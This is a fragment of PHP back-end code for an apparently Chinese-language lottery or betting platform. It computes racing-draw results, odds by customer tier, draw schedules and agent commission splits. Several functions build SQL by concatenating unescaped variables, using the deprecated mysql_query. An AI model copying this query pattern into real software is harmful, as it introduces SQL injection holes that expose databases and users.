					{
						if ($count == 5)
						{
							$len++;
							array_push($Number, $strArr[$a].','.$strArr[$b].','.$strArr[$c].','.$strArr[$d].','.$strArr[$e]);
							continue;
						}
					}//5層嵌套
				}//4層嵌套
			}//3層嵌套
		}//2層嵌套
	} //1層嵌套
	$result = array($len, $Number, count($strArr));
	return $result;
}


function _getBallString_nc ($resultArray, $BallArray, $index=0, $bool=FALSE)
{
	$countArray = array();
	for ($i=0; $i<count($BallArray); $i++)
	{
		if ($bool == FALSE && Copyright)
		{
			$numStrng = sum_ball_string_nc($resultArray, $i);
			if ($numStrng == $BallArray[$i])
				$countArray['第'.$index.'球-'.$BallArray[$i]] = 1;
			else
				$countArray['第'.$index.'球-'.$BallArray[$i]] = 0;
		}
		else 
		{
			$nString = sum_ball_str_a_nc(sum_int($resultArray, $i), $i);
			if ($nString == $BallArray[$i])
				$countArray[$BallArray[$i]] = 1;
			else
				$countArray[$BallArray[$i]] = 0;
		}
	}
	return $countArray;
}

function sresult ($select)
{
	switch ($select)
	{
		case '01' : $select = 'h1'; break;
		case '02' : $select = 'h2'; break;
		case '03' : $select = 'h3'; break;
		case '04' : $select = 'h4'; break;
		case '05' : $select = 'h5'; break;
		case '06' : $select = 'h6'; break;
		case '07' : $select = 'h7'; break;
		case '08' : $select = 'h8'; break;
		case '09' : $select = 'h9'; break;
		case '10' : $select = 'h10'; break;
		case '11' : $select = 'h11'; break;
		case '12' : $select = 'h12'; break;
		case '13' : $select = 'h13'; break;
		case '14' : $select = 'h14'; break;
		case '15' : $select = 'h15'; break;
		case '16' : $select = 'h16'; break;
		case '17' : $select = 'h17'; break;
		case '18' : $select = 'h18'; break;
		case '19' : $select = 'h19'; break;
		case '20' : $select = 'h20'; break;
		case '大' : $select = 'h21'; break;
		case '小' : $select = 'h22'; break;
		case '單' : $select = 'h23'; break;
		case '雙' : $select = 'h24'; break;
		case '尾大' : $select = 'h25'; break;
		case '尾小' : $select = 'h26'; break;
		case '合數單' : $select = 'h27'; break;
		case '合數雙' : $select = 'h28'; break;
		case '東' : $select = 'h29'; break;
		case '南' : $select = 'h30'; break;
		case '西' : $select = 'h31'; break;
		case '北' : $select = 'h32'; break;
		case '中' : $select = 'h33'; break;
		case '發' : $select = 'h34'; break;
		case '白' : $select = 'h35'; break;
		case '總和大' : $select = 'h1'; break;
		case '總和小' : $select = 'h3'; break;
		case '總和單' : $select = 'h2'; break;
		case '總和雙' : $select = 'h4'; break;
		case '總和尾大' : $select = 'h5'; break;
		case '總和尾小' : $select = 'h7'; break;
		case '龍' : $select = 'h6'; break;
		case '虎' : $select = 'h8'; break;
	}
	return $select;
}

function SubBallpk ($num, $ball, $p=0)
{
	switch ($num)
	{
		case 0 : //冠亚军和大小
			if ($ball <= 11)
				return $p==0 ? '小' : '小';
			else
				return $p==0 ? '<font color="red">大</font>' : '大';
		case 1 : //冠亚军和單雙
			if ($ball % 2 == 0)
				return $p==0 ? '<font color="red">雙</font>' : '雙';
			else 
				return $p==0 ? '單' : '單';
		case 2 : //龍虎
			if ($ball[0] > $ball[1])
				return $p==0 ? '<font color="0000ff">龍</font>' : '龍';
			else
				return $p==0 ? '虎' : '虎';
	}
}

function selectOddspk ($index=1, $Ball,$gametype=6)
{
	$select = array();
	for ($i=1; $i<=$index; $i++)
	{
		array_push($select, "`h{$i}`,");
	}
	$select = mb_substr(join($select, ''), 0,-1);
	$db = new DB();
	return $db->query("SELECT {$select} FROM `g_odds".$gametype."` WHERE g_type =  '{$Ball}' LIMIT 1 ", 1);
}
function sum_str_s_pk ($result, $index, $int=25, $bool=FALSE, $num=NULL, $count=NULL, $p=1)
{
	$k =null;
	$ball = null;
	$stratTd = '<td class="z_cl">';
	$topTd = '</td>,<td class="z_cl">';
	$td = array();
	$ar = array();
	$str='';
	for ($i=0; $i<count($result); $i++)
	{
		$ball = @$result[$i][$index];
		if ($bool && Copyright) //龍虎
		{
			$ar[0] = $result[$i][0];
			$ar[1] = $result[$i][7];
			$ball = sum_ball_str_a($ar, 0, $p);
		}
		else if ($num)
		{
			$ball = sum_ball_string($ball, $num, $p);
		}
		else if ($count)
		{
			//print_r($count);
			$v = $result[$i][0]+$result[$i][1];
			if($count==6) $ball = $v;
			else{
			$ball = sum_ball_str_a_smpk($v, $count, $p);
			$ball = str_replace("冠亞和","",$ball);
			}	
		}
		if ($k != $ball){
			$str .= $i == 0 ?  $stratTd.$ball : $topTd.$ball;	
			}
		else 
			$str .= '<br />'.$ball;
		$k = $ball;
	}
	$str .= '</td>';
	$arr = explode(',', $str);
	for ($i=0; $i<25; $i++)
	{
		$td[] ='<td class="z_cl"></td>';
	}

	$arr = array_merge($td,$arr);
	$arr = array_slice($arr, -25);
	return $arr;
}
function sum_int_pk ($result, $index)
{
	if ($index>=2 && $index<=7)
	{
		$num = $result[0]+$result[1];
	}
	else if ($index==0 || $index==1)
	{
		$num = array(0=>0, 1=>0);
		$num[0] = $result[0];
		$num[1] = $result[7];
	}
	else 
	{
		$num = null;
	}
	return $num;
}
function sum_ball_string_pk ($ball, $index,$ball2=null, $p=1)
{
	$number = $ball;
	if ($index==0 || $index==1) //計算單雙
	{
		if ($number%2 == 0) 
			return '雙';
		else 
			return '單';
	}
	else if ($index==2 || $index==3) //計算大小
	{
		if ($number<=5) 
			return '小';
		else 
			return '大';
	}else if ($index==4 || $index==5) //計算龙虎
	{//print_r($ball.'---'.$ball2);
		if($ball2!=null||$ball2!=""){
			if ($ball > $ball2)
				return '龍';
			else
				return '虎';
		}
	}
	
}
function sum_ball_str_a_pk ($ball, $index, $p=1)
{

	if ($index==0 || $index==1) //計算龍虎
	{
		if ($ball[0] > $ball[1])
			return '龍';
		else
			return '虎';
	}else 
	if ($index==2 || $index==3) //計算冠亚和大小
	{
		if ($ball>11)
			return '冠亞和大';
		else
			return '冠亞和小';
	}else if ($index==4 || $index==5) //計算冠亚和单双
	{
		if ($ball % 2 == 0) 
			return '冠亞和雙';
		else
			return '冠亞和單';
	}
	
}
function sum_ball_str_a_smpk ($ball, $index, $p=1)
{

	
	if ($index==2 || $index==3) //計算冠亚和大小
	{
		if ($ball>11)
			return '冠亞和大';
		else
			return '冠亞和小';
	}else if ($index==4 || $index==5) //計算冠亚和单双
	{
		if ($ball % 2 == 0) 
			return '冠亞和雙';
		else
			return '冠亞和單';
	}
	
}
function sum_ball_count_pk ($result, $gid)
{
	$count = array(0=>0, 1=>0);
	$ballArr = array();
	$gid--;
	for ($i=1; $i<11; $i++)
	{
		for ($n=0; $n<count($result); $n++)
		{
			//出球率統計
			if ($i == @$result[$n][$gid])
				$count[0]++;
			//無出期數統計
			if ($i != $result[$n][0] && $i != $result[$n][1] && $i != $result[$n][2] && $i != $result[$n][3] && $i != $result[$n][4] && $i != $result[$n][5] && $i != $result[$n][6] && $i != $result[$n][7]&& $i != $result[$n][8]&& $i != $result[$n][9])
				$count[1]++;
			else
				$count[1] = 0;
		}
		$ballArr['row_1'][$i] = $count[0];
		$ballArr['row_2'][$i] = $count[1];
		$count[0] = 0;
		$count[1] = 0;
	}
	return $ballArr;
}
function sum_ball_count_xyft ($result, $gid)
{
	$count = array(0=>0, 1=>0);
	$ballArr = array();
	$gid--;
	for ($i=1; $i<11; $i++)
	{
		for ($n=0; $n<count($result); $n++)
		{
			//出球率統計
			if ($i == @$result[$n][$gid])
				$count[0]++;
			//無出期數統計
			if ($i != $result[$n][0] && $i != $result[$n][1] && $i != $result[$n][2] && $i != $result[$n][3] && $i != $result[$n][4] && $i != $result[$n][5] && $i != $result[$n][6] && $i != $result[$n][7]&& $i != $result[$n][8]&& $i != $result[$n][9])
				$count[1]++;
			else
				$count[1] = 0;
		}
		$ballArr['row_1'][$i] = $count[0];
		$ballArr['row_2'][$i] = $count[1];
		$count[0] = 0;
		$count[1] = 0;
	}
	return $ballArr;
}
function _getBallStringpk ($resultArray, $BallArray, $index=0, $bool=FALSE,$resultArray1=null)
{
	$countArray = array();
	for ($i=0; $i<count($BallArray); $i++)
	{
		if ($bool == FALSE && Copyright)
		{
			if($resultArray1==null)
				$numStrng = sum_ball_string_pk($resultArray, $i);
			else{		
				$numStrng = sum_ball_string_pk($resultArray, $i,$resultArray1);
				}
			if ($numStrng == $BallArray[$i]){
					switch($index){
					case 1 :$countArray['冠军-'.$BallArray[$i]] = 1;break;
					case 2 :$countArray['亚军-'.$BallArray[$i]] = 1;break;
					default :$countArray['第'.$index.'名-'.$BallArray[$i]] = 1;break;
					}
				
				}
			else{
					switch($index){
					case 1 :$countArray['冠军-'.$BallArray[$i]] = 0;break;
					case 2 :$countArray['亚军-'.$BallArray[$i]] = 0;break;
					default :$countArray['第'.$index.'名-'.$BallArray[$i]] = 0;break;
					}
				}
		}
		else 
		{
			$nString = sum_ball_str_a_smpk(sum_int_pk($resultArray, $i), $i);
			if ($nString == $BallArray[$i])
				$countArray[$BallArray[$i]] = 1;
			else
				$countArray[$BallArray[$i]] = 0;
		}
	}
	return $countArray;
}
function sum_ball_count_1_pk ($BallString, $BallString_a, $result, $sMax=3)
{
	$numArray1 = array();
	$numArray2 = array();
	$countArray1 = array();
	$countArray2 = array();
	for ($i=0; $i<count($result); $i++) //循環期數
	{
		//print_r($result);
		for ($n=0; $n<count($result[$i]); $n++) //循環10個號碼
		{
			$s = $n+1;
			if($n>4)
			$countArray1 += _getBallStringpk($result[$i][$n], $BallString, $s,FALSE);
			else{
			$countArray1 += _getBallStringpk($result[$i][$n], $BallString, $s,FALSE,$result[$i][9-$n]);
			}
		}
		$countArray2 += _getBallStringpk($result[$i], $BallString_a, 0, true);
		//1-10球雙面
		foreach ($countArray1 as $key=>$value)
		{
			if ($value != 0)
				@$numArray1[$key] += $value;
			else 
				$numArray1[$key] = 0;
		}
		$countArray1 = array();
		
		//總分雙面、龍虎
		foreach ($countArray2 as $key=>$value)
		{
			if ($value != 0)
				@$numArray2[$key] += $value;
			else 
				$numArray2[$key] = 0;
		}
		$countArray2 = array();
	}
	$numArray1 = array_merge($numArray1, $numArray2);
	$numArr = array();
	$count = 0;
	foreach ($numArray1 as $key=>$value)
	{
		//if ($count >=20)
			//break;
		if ($value >=$sMax && Copyright)
		{
			$count++;
			$numArr[$key] = $value;
		}
	}
	return $numArr;
}
function sum_ball_count_1_xyft ($BallString, $BallString_a, $result, $sMax=3)
{
	$numArray1 = array();
	$numArray2 = array();
	$countArray1 = array();
	$countArray2 = array();
	for ($i=0; $i<count($result); $i++) //循環期數
	{
		for ($n=0; $n<count($result[$i]); $n++) //循環10個號碼
		{
			$s = $n+1;
			if($n>4)
			$countArray1 += _getBallStringpk($result[$i][$n], $BallString, $s,FALSE);
			else{
			$countArray1 += _getBallStringpk($result[$i][$n], $BallString, $s,FALSE,$result[$i][9-$n]);
			}
		}
		$countArray2 += _getBallStringpk($result[$i], $BallString_a, 0, true);
		//1-10球雙面
		foreach ($countArray1 as $key=>$value)
		{
			if ($value != 0)
				@$numArray1[$key] += $value;
			else 
				$numArray1[$key] = 0;
		}
		$countArray1 = array();
		
		//總分雙面、龍虎
		foreach ($countArray2 as $key=>$value)
		{
			if ($value != 0)
				@$numArray2[$key] += $value;
			else 
				$numArray2[$key] = 0;
		}
		$countArray2 = array();
	}
	$numArray1 = array_merge($numArray1, $numArray2);
	$numArr = array();
	$count = 0;
	foreach ($numArray1 as $key=>$value)
	{
		//if ($count >=20)
			//break;
		if ($value >=$sMax && Copyright)
		{
			$count++;
			$numArr[$key] = $value;
		}
	}
	return $numArr;
}
function sresultpk ($select)
{
	switch ($select)
	{
		case '1' : $select = 'h1'; break;
		case '2' : $select = 'h2'; break;
		case '3' : $select = 'h3'; break;
		case '4' : $select = 'h4'; break;
		case '5' : $select = 'h5'; break;
		case '6' : $select = 'h6'; break;
		case '7' : $select = 'h7'; break;
		case '8' : $select = 'h8'; break;
		case '9' : $select = 'h9'; break;
		case '10' : $select = 'h10'; break;
		
		case '大' : $select = 'h11'; break;
		case '小' : $select = 'h12'; break;
		case '單' : $select = 'h13'; break;
		case '雙' : $select = 'h14'; break;
		
		case '龍' : $select = 'h15'; break;
		case '虎' : $select = 'h16'; break;
	}
	return $select;
}
function configModelPanpk($type,$gametype=6)
{
	$db=new DB();
	$sql = "SELECT * FROM g_odds".$gametype."_{$type} ";
	$result = $db->query($sql, 1);
	return $result[0];
}
function setoddspk($key, $val, $user, $param=0,$Ball=0,$gametype=6)
{

	$odds = $val;
	if ($param == 0 && Copyright)
	{
		if ($key == 'h1'||$key == 'h2'||$key == 'h3'||$key == 'h4'||$key == 'h5'||$key == 'h6'||$key == 'h7'||$key == 'h8'||$key == 'h9'||$key == 'h10'){
			if ($user[0]['g_panlu'] == 'B'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_b1'];
						$result=configModelPanpk('b',$gametype);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						case 'Ball_6':$odds = $val-$result['h6'];break;
						case 'Ball_7':$odds = $val-$result['h7'];break;
						case 'Ball_8':$odds = $val-$result['h8'];break;
						case 'Ball_9':$odds = $val-$result['h9'];break;
						case 'Ball_10':$odds = $val-$result['h10'];break;
						}			
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c1'];
						$result=configModelPanpk('c',$gametype);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						case 'Ball_6':$odds = $val-$result['h6'];break;
						case 'Ball_7':$odds = $val-$result['h7'];break;
						case 'Ball_8':$odds = $val-$result['h8'];break;
						case 'Ball_9':$odds = $val-$result['h9'];break;
						case 'Ball_10':$odds = $val-$result['h10'];break;
						}	
			}
		} else if ($key == 'h11'||$key == 'h12'||$key == 'h13'||$key == 'h14'||$key == 'h15'||$key == 'h16'){
			if ($user[0]['g_panlu'] == 'B'){
				  	//	$odds = $val - $ConfigModel['g_odds_ratio_b4'];
					$result=configModelPanpk('b',$gametype);
					if ($key == 'h11'||$key == 'h12'){
					$odds = $val-$result['h11'];
					}
					if ($key == 'h13'||$key == 'h14'){
					$odds = $val-$result['h12'];
					}
					if ($key == 'h15'||$key == 'h16'){
					$odds = $val-$result['h13'];
					}
				
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c4'];
						$result=configModelPanpk('c',$gametype);
					if ($key == 'h11'||$key == 'h12'){
					$odds = $val-$result['h11'];
					}
					if ($key == 'h13'||$key == 'h14'){
					$odds = $val-$result['h12'];
					}
					if ($key == 'h15'||$key == 'h16'){
					$odds = $val-$result['h13'];
					}
			}
		} 
	}
	else if ($param == 1)
	{
		if ($user[0]['g_panlu'] == 'B'){
			//$odds = $val - $ConfigModel['g_odds_ratio_b4'];
						$result=configModelPanpk('b',$gametype);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						case 'Ball_6':$odds = $val-$result['h6'];break;
						case 'Ball_7':$odds = $val-$result['h7'];break;
						case 'Ball_8':$odds = $val-$result['h8'];break;
						case 'Ball_9':$odds = $val-$result['h9'];break;
						case 'Ball_10':$odds = $val-$result['h10'];break;
						}	
					if($Ball=='Ball_11'){	
					$result=configModelPanpk('b',$gametype);
					$odds = $val-$result['h14'];
					}
					if($Ball=='Ball_12'){	
					$result=configModelPanpk('b',$gametype);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h15'];
					}else{
					$odds = $val-$result['h16'];
					}
					}
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_c4'];
						$result=configModelPanpk('c',$gametype);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						case 'Ball_6':$odds = $val-$result['h6'];break;
						case 'Ball_7':$odds = $val-$result['h7'];break;
						case 'Ball_8':$odds = $val-$result['h8'];break;
						case 'Ball_9':$odds = $val-$result['h9'];break;
						case 'Ball_10':$odds = $val-$result['h10'];break;
						}	
					if($Ball=='Ball_11'){	
					$result=configModelPanpk('c',$gametype);
					$odds = $val-$result['h14'];
					}
					if($Ball=='Ball_12'){	
					$result=configModelPanpk('c',$gametype);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h15'];
					}else{
					$odds = $val-$result['h16'];
					}
					}
		}
	}
	else if ($param == 2)
	{
		if ($user[0]['g_panlu'] == 'B'){
			//$odds = $val - $ConfigModel['g_odds_ratio_b5'];
					$result=configModelPanpk('b',$gametype);
					if($Ball=='Ball_12'){	
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h15'];
					}else{
					$odds = $val-$result['h16'];
					}
					}else{
					$odds = $val-$result['h11'];
					}
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_c5'];
					$result=configModelPanpk('c',$gametype);
					if($Ball=='Ball_12'){	
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h15'];
					}else{
					$odds = $val-$result['h16'];
					}
					}else{
					$odds = $val-$result['h11'];
					}
		}
	}else{
	if ($key == 'h1'||$key == 'h2'||$key == 'h3'||$key == 'h4'||$key == 'h5'||$key == 'h6'||$key == 'h7'||$key == 'h8'||$key == 'h9'||$key == 'h10'){
			if ($user[0]['g_panlu'] == 'B'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_b1'];
						$result=configModelPanpk('b',$gametype);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						}	
						if($Ball=='Ball_11'){	
					$result=configModelPanpk('b',$gametype);
					$odds = $val-$result['h14'];
					}
					if($Ball=='Ball_12'){	
					$result=configModelPanpk('b',$gametype);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h15'];
					}else{
					$odds = $val-$result['h16'];
					}	
					}	
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c1'];
						$result=configModelPanpk('c',$gametype);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						}	
						if($Ball=='Ball_11'){	
					$result=configModelPanpk('c',$gametype);
					$odds = $val-$result['h14'];
					}
					if($Ball=='Ball_12'){	
					$result=configModelPanpk('c',$gametype);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h15'];
					}else{
					$odds = $val-$result['h16'];
					}
					}
			}
		} else if ($key == 'h11'||$key == 'h12'||$key == 'h13'||$key == 'h14'||$key == 'h15'||$key == 'h16'||$key == 'h17'){
			if ($user[0]['g_panlu'] == 'B'){
				  	//	$odds = $val - $ConfigModel['g_odds_ratio_b4'];
					$result=configModelPanpk('b',$gametype);
					if ($key == 'h11'||$key == 'h12'){
					$odds = $val-$result['h11'];
					}
					if ($key == 'h13'||$key == 'h14'){
					$odds = $val-$result['h12'];
					}
					if ($key == 'h15'||$key == 'h16'){
					$odds = $val-$result['h13'];
					}
				if($Ball=='Ball_11'){	
					$result=configModelPanpk('b',$gametype);
					$odds = $val-$result['h14'];
					}
					if($Ball=='Ball_12'){	
					$result=configModelPanpk('b',$gametype);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h15'];
					}else{
					$odds = $val-$result['h16'];
					}
					}
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c4'];
						$result=configModelPanpk('c',$gametype);
					if ($key == 'h11'||$key == 'h12'){
					$odds = $val-$result['h11'];
					}
					if ($key == 'h13'||$key == 'h14'){
					$odds = $val-$result['h12'];
					}
					if ($key == 'h15'||$key == 'h16'){
					$odds = $val-$result['h13'];
					}
					if($Ball=='Ball_11'){	
					$result=configModelPanpk('c',$gametype);
					$odds = $val-$result['h14'];
					}
					if($Ball=='Ball_12'){	
					$result=configModelPanpk('c',$gametype);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h15'];
					}else{
					$odds = $val-$result['h16'];
					}
					}
			}
		} 
	}
	return $odds;
}

function gameTypeFormatpk($type)
{
	$_type = $type;
	switch ($type){
		case 't1' : $_type = '冠军'; break;
		case 't2' : $_type = '亚军'; break;
		case 't3' : $_type = '第三名'; break;
		case 't4' : $_type = '第四名'; break;
		case 't5' : $_type = '第五名'; break;
		case 't6' : $_type = '第六名'; break;
		case 't7' : $_type = '第七名'; break;
		case 't8' : $_type = '第八名'; break;
		case 't9' : $_type = '第九名'; break;
		case 't10' : $_type = '第十名'; break;
		case 't11' : $_type = '冠、亞軍和'; break;
		case 't12' : $_type = '冠亞和'; break;
	}
	return $_type;
}
function InsertNumberpk ($number,$day=1, $closeTime=2)
{

	mysql_query("Delete from g_kaipan6 where g_id>0");
	$mm=90;
	$dd=179;
	$number=$number+1;
	$insertDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')+$day, date('Y')));
	$zfbdate1=$insertDate." 09:02:20";
	$zfbdate=date('Y-m-d H:i:s',strtotime($zfbdate1)+(300-$mm));
	$zfbdatend=$insertDate." 09:07:20";
	$sql="INSERT INTO  g_kaipan6 set g_qishu='".$number."',g_kai_date='".$zfbdate1."',g_feng_date='".$zfbdate."',g_open_date='".$zfbdatend."',g_lock=2 ";
	$exe=mysql_query($sql) or  die("数据库修改出错".$sql);
	

	for ($B=1;$B<$dd;$B++){
		$number=$number+1;
		$zfbdate=date('Y-m-d H:i:s',strtotime($zfbdatend)+(300-$mm));
		$zfbdate1=date('Y-m-d H:i:s',strtotime($zfbdatend));
		//$zfbdatend=date('Y-m-d H:i:s',strtotime($zfbdatend)+300);
		$zfbdatend=date('Y-m-d H:i:s',strtotime($zfbdatend)+300);
		//if(strtotime($zfbdatend) > mktime('21','30','0',date('m',strtotime($zfbdatend)),date('d',strtotime($zfbdatend)),date('Y',strtotime($zfbdatend))))
		//{
		//	break;
		//}
		$sql="INSERT INTO  g_kaipan6 set g_qishu='".$number."',g_kai_date='".$zfbdate1."',g_feng_date='".$zfbdate."',g_open_date='".$zfbdatend."',g_lock=1 ";
		$exe=mysql_query($sql) or  die("数据库修改出错".$sql);

	}
}

function initializeOddspk()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds6 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17` FROM g_odds6_default", 1);
	$sql = "INSERT INTO `g_odds6`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	$db->query($sql, 2);
}
//极速赛车  by mj QQ:1391082827
function initializeOddsxyft()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds4 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17` FROM g_odds4_default", 1);
	$sql = "INSERT INTO `g_odds4`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	$db->query($sql, 2);
}

function initializeOddsmg()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds4 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17` FROM g_odds4_default", 1);
	$sql = "INSERT INTO `g_odds4`(`g_id`, `g_type`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `h7`, `h8`, `h9`, `h10`, `h11`, `h12`, `h13`, `h14`, `h15`, `h16`, `h17`) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	$db->query($sql, 2);
}

function initializeOddskl8()
{
	$db = new DB();
	$db->query("DELETE FROM g_odds8 WHERE g_id >0", 2);
	$result = $db->query("SELECT  `g_id`, `g_type`, h1,h2,h3,h4,h5,h6,h7,h8,h9,h10,h11,h12,h13,h14,h15,h16,h17,h18,h19,h20,h21,h22,h23,h24,h25,h26,h27,h28,h29,h30,h31,h32,h33,h34,h35,h36,h37,h38,h39,h40,h41,h42,h43,h44,h45,h46,h47,h48,h49,h50,h51,h52,h53,h54,h55,h56,h57,h58,h59,h60,h61,h62,h63,h64,h65,h66,h67,h68,h69,h70,h71,h72,h73,h74,h75,h76,h77,h78,h79,h80 FROM g_odds8_default", 1);
	$sql = "INSERT INTO `g_odds8`(`g_id`, `g_type`, h1,h2,h3,h4,h5,h6,h7,h8,h9,h10,h11,h12,h13,h14,h15,h16,h17,h18,h19,h20,h21,h22,h23,h24,h25,h26,h27,h28,h29,h30,h31,h32,h33,h34,h35,h36,h37,h38,h39,h40,h41,h42,h43,h44,h45,h46,h47,h48,h49,h50,h51,h52,h53,h54,h55,h56,h57,h58,h59,h60,h61,h62,h63,h64,h65,h66,h67,h68,h69,h70,h71,h72,h73,h74,h75,h76,h77,h78,h79,h80) VALUES ";
	for ($i=0; $i<count($result); $i++){
		$sql .="(";
		foreach ($result[$i] as $value){
			if ($value == null)
				$sql .= "null,";
			else 
				$sql .= "'{$value}',";
		}
		$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
		$sql .="),";
	}
	$sql = mb_substr($sql, 0, mb_strlen($sql)-1);
	$db->query($sql, 2);
}
function floorMoneypk ($user, $types, $ball, $RankUser, $p=false)
{
	$pan = strtolower($user[0]['g_panlu']);
	$g_a_limit = 'g_'.$pan.'_limit';
	if ($p == true){
		$result = GetRankXianErpk($types, $ball, $RankUser[0]['g_name'], $g_a_limit,4);
	}else {
		$result = GetRankXianErpk($types, $ball, $RankUser[0]['g_name'], $g_a_limit);
	}
	return $result[0][1];
}
function SumRankDistributionpk ($user, $money, $ball, $types, $p=false)
{
	$DtnArray = array('tueishui_1'=>0, 'tueishui_2'=>0, 'tueishui_3'=>0, 'tueishui_4'=>0, 'distribution_1'=>0, 'distribution_2'=>0, 'distribution_3'=>0, 'distribution_4'=>0);
	$db = new DB();
	//得到直屬上級
	$RankUser = RankUser($db, $user[0]['g_nid']);
	if ($user[0]['g_mumber_type'] == 2)
	{
		$nid = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-32);
		$RankUser = RankUser ($db, $nid);
		//判斷屬於什麽級別的直屬會員
		switch ($RankUser[0]['g_login_id'])
		{
			case 56: //股東直屬
				$floorMoneypk = floorMoneypk($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_4'] = $floorMoneypk; //分公司退水
				$DtnArray['tueishui_3'] = $floorMoneypk; //分公司退水
				$DtnArray['distribution_4'] = $user[0]['g_distribution'];
				if($RankUser[0]['g_zcgs']==0){
				$DtnArray['distribution_4'] =$RankUser[0]['g_distribution_limit']; //公司占成
				}				
			break;
			case 22: //股東直屬
				$floorMoneypk = floorMoneypk($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_3'] = $floorMoneypk; //股東退水
				$DtnArray['tueishui_2'] = $floorMoneypk; //股東退水
				$DtnArray['distribution_3'] = $user[0]['g_distribution'];
				if($RankUser[0]['g_zcgs']==0){
				$DtnArray['distribution_4'] =($RankUser[0]['g_distribution_limit']+$RankUser[0]['g_distribution']) - $DtnArray['distribution_3']; //公司占成
				}else{
				$DtnArray['distribution_4']=$RankUser[0]['g_distribution_limit'];
				}
				//繼續查詢上級
				$value = mb_substr($nid, 0, mb_strlen($nid)-32);
				$RankUser = RankUser($db, $value);
				$floorMoneypk = floorMoneypk($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_4'] = $floorMoneypk; //公司退水
			break;
			case 78: //總代理直屬
				//退水百分比
